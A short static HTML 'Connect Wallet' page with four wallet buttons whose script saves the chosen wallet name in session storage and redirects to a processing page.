<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Connect Wallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: #0f172a;
      color: #fff;
    }

    .container {
      max-width: 420px;
      margin: 100px auto;
      background: #020617;
      padding: 30px;
      border-radius: 12px;
      text-align: center;
    }

    p {
      color: #94a3b8;
    }

    .wallet {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      background: #020617;
      border: 1px solid #1e293b;
      color: #fff;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
    }

    .wallet:hover {
      background: #1e293b;
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>Connect Wallet</h1>
    <p>Select a wallet to continue</p>

    <button class="wallet" onclick="goNext('MetaMask')">MetaMask</button>
    <button class="wallet" onclick="goNext('Trust Wallet')">Trust Wallet</button>
    <button class="wallet" onclick="goNext('Coinbase')">Coinbase</button>
    <button class="wallet" onclick="goNext('Phantom')">Phantom</button>
  </div>

  <script>
    function goNext(wallet) {
      sessionStorage.setItem("wallet", wallet);
      window.location.href = "/processing.html";
    }
  </script>

</body>
</html>
